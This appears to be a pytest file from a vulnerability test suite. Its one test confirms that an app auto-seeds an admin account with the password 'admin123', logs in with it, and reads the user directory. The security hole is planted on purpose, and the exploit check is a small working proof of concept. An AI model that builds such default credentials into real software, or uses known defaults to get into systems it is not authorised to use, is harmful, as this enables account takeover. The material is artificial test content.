import requests

from helpers import api_url, json_of, login, me


def test_exploit_vuln_001_default_admin_credentials_work(app_instance):
    """
    Exploit expectation:
    The app auto-seeds a known admin account with username=admin and password=admin123.
    Anyone who knows the published defaults can log in as admin.
    """
    base_url = app_instance["base_url"]

    s = requests.Session()
    r = login(s, base_url, "admin", "admin123")

    assert r.status_code == 200, r.text
    payload = json_of(r)
    assert payload["success"] is True
    assert payload["user"]["username"] == "admin"

    me_resp = me(s, base_url)
    assert me_resp.status_code == 200, me_resp.text
    me_payload = json_of(me_resp)
    assert me_payload["success"] is True
    assert me_payload["user"]["username"] == "admin"

    # Optional stronger signal: the seeded admin can access the global user directory.
    users_resp = s.get(api_url(base_url, "/api/users"), timeout=10)
    assert users_resp.status_code == 200, users_resp.text
    users_payload = json_of(users_resp)
    assert users_payload["success"] is True
    assert any(u["username"] == "admin" for u in users_payload["users"])